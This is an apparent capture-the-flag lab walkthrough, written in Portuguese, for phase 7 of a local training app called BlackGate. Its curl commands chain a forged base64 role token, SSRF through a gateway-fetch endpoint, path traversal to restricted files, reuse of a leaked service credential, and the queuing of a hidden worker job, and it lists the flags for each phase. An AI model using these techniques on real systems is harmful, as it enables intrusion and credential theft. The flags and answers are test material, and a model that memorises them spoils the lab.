# Lab 05 - BlackGate - Walkthrough da Fase 7

Este walkthrough cobre a **Fase 7 - Report Workflow Abuse / Queue Preparation** do Lab 05. A aplicacao mantem as fases anteriores e adiciona um workflow legado de reports dentro de `legacy-panel.internal`.

Tudo continua seguro e local: nao ha request real para internet, banco externo, shell, upload, Redis, worker real ou command injection.

## Como subir

```bash
cd lab-05-blackgate
docker compose up --build
```

Acesse:

```text
http://localhost:8096
```

## Saude e versao

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/api/version
```

Resultado esperado:

```json
{
  "service": "blackgate",
  "status": "ok",
  "version": "1.6.0-phase7"
}
```

`/api/version` deve retornar build `bg-phase7-report-workflow`.

## Login e contexto operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest&password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fases anteriores preservadas

Fase 3:

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Flag esperada:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

Fase 4:

```bash
CORE_META=$(node -e 'console.log(encodeURIComponent("http://api-core.internal/metadata"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CORE_META"
```

Flag esperada:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

Fase 5:

```bash
PHASE5_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PHASE5_FILE"
```

Flag esperada:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Repetir a cadeia ate a legacy_session

Leia os arquivos restritos usados na Fase 6 para encontrar a credencial de manutencao:

```bash
CREDS_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/legacy-panel-creds.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREDS_FILE"
```

Credencial util:

```text
svc_migration / migrate-yellow-gate
```

Autentique no legacy realm:

```bash
LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
```

Resultado esperado:

```text
bg6-legacy-session-migration
```

Acesse maintenance:

```bash
LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
```

Flag esperada da Fase 6:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

A pista nova e:

```text
Maintenance reports queue jobs for asynchronous processing.
```

## Acessar reports

Sem sessao:

```bash
REPORTS_NO_SESSION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORTS_NO_SESSION"
```

Resultado esperado: `legacy_session_required`.

Com sessao:

```bash
REPORTS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORTS"
```

Resultado esperado:

```json
{
  "service": "legacy-panel",
  "module": "reports",
  "status": "partial",
  "available_actions": ["templates", "preview", "create"],
  "queue": "migration-report-queue"
}
```

## Enumerar templates

Selector padrao:

```bash
TEMPLATES=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES"
```

Mostra apenas templates enabled.

Archive parcial:

```bash
TEMPLATES_ARCHIVED=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration&include=archived"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES_ARCHIVED"
```

Archive completo com audit:

```bash
TEMPLATES_ALL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration&include=all&audit=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES_ALL"
```

Aqui aparece `worker-diagnostics` como entrada hidden/maintenance.

## Ler notas internas de reports

Use o mesmo bypass controlado da Fase 5:

```bash
REPORT_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/report-workflow-notes.txt"))')
QUEUE_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/queue-review.txt"))')
TEMPLATE_ARCHIVE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/template-archive.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORT_NOTES"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$QUEUE_REVIEW"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATE_ARCHIVE"
```

Pontos importantes:

- `queue-only` foi adicionado para validacao de manutencao;
- `worker-diagnostics` nao aparece no seletor publico;
- `internal` permanece restrito;
- a fila de manutencao e `maintenance-worker`.

## Testar previews e decoys

Preview normal:

```bash
PREVIEW_OK=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_OK"
```

PDF:

```bash
PREVIEW_PDF=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=migration-check&format=pdf&scope=summary"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_PDF"
```

Resultado esperado: `unsupported_format`.

Worker diagnostics:

```bash
PREVIEW_WORKER=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=summary"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_WORKER"
```

Resultado esperado:

```text
Template requires queue validation before rendering.
```

## Criar jobs decoy

Job normal sem flag:

```bash
CREATE_NORMAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_NORMAL"
```

Worker diagnostics com queue errada:

```bash
CREATE_WRONG_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=migration-report-queue&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_WRONG_QUEUE"
```

Resultado esperado: job aceito na fila errada, sem flag.

Worker diagnostics com render sincrono:

```bash
CREATE_RENDER=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=render"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_RENDER"
```

Resultado esperado: `synchronous_render_disabled`.

## Criar o job correto da Fase 7

Combinacao:

```text
template=worker-diagnostics
format=json
scope=internal
queue=maintenance-worker
mode=queue-only
```

Comando:

```bash
CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
```

Resposta esperada:

```json
{
  "service": "legacy-panel",
  "module": "reports",
  "created": true,
  "job_id": "bg7-job-worker-diagnostics",
  "queue": "maintenance-worker",
  "status": "queued",
  "risk": "unsafe-template-accepted",
  "finding": "report workflow accepted an internal worker diagnostics job",
  "flag": "FLAG{blackgate_report_workflow_abuse_phase7}",
  "next_hint": "Queued diagnostics jobs are processed by a maintenance worker in the next phase."
}
```

## Ver fila, jobs e worker

Listar jobs:

```bash
JOBS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/jobs?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$JOBS"
```

Detalhe do job:

```bash
JOB_DETAIL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$JOB_DETAIL"
```

Fila:

```bash
QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/queue?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$QUEUE"
```

Worker status:

```bash
WORKER_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/worker-status?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS"
```

O worker deve estar `paused`; nao ha execucao de comandos nem processamento real nesta fase.

## Flags confirmadas ate esta fase

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
FLAG{blackgate_gateway_trust_ssrf_phase4}
FLAG{blackgate_files_vault_controlled_read_phase5}
FLAG{blackgate_legacy_credential_reuse_phase6}
FLAG{blackgate_report_workflow_abuse_phase7}
```

## O que fica para a proxima fase

A Fase 8 deve usar o job criado na Fase 7 para simular processamento perigoso pelo maintenance worker. Isso ainda nao existe nesta fase.
